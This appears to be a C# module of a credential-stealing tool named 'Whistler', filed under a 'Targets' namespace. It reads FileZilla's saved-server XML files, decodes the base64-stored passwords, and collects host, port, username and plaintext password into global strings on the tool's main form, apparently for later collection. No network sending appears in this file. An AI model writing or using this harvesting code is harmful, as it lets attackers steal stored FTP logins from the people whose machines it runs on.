using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml;
using W2;

namespace Whistler.Classes.Targets
{
    class classFileZilla
    {
        public static void FZ_Read(string Path)
        {
            try
            {
                XmlDocument objXmlDocument = new XmlDocument();
                objXmlDocument.Load(Path);

                foreach (XmlNode objXmlNode in objXmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
                {
                    frmMain.FZ_final += ("Host: " + objXmlNode.ChildNodes[0].InnerText);
                    frmMain.FZ_final += (" Port: " + objXmlNode.ChildNodes[1].InnerText);
                    frmMain.FZ_final += (" User: " + objXmlNode.ChildNodes[4].InnerText);
                    string encodedString = objXmlNode.ChildNodes[5].InnerText;
                    byte[] data = Convert.FromBase64String(encodedString);//Wow such secure passwords
                    string decodedString = Encoding.UTF8.GetString(data);
                    frmMain.FZ_final += (" Pass: " + decodedString);
                    frmMain.FZ_final += ("\n");
                    frmMain.decoded += objXmlNode.ChildNodes[0].InnerText + objXmlNode.ChildNodes[1].InnerText + objXmlNode.ChildNodes[4].InnerText + decodedString;
                }

            }
            catch (Exception ex) { Console.WriteLine(ex.Message); }
        }
        public static void FZ()
        {
            foreach (string strFilename in frmMain.strFilenames)
            {
                string strPath = Path.Combine(frmMain.strFolderPath, strFilename);
                if (File.Exists(strPath))
                {
                    FZ_Read(strPath);
                }
            }
        }
    }
}
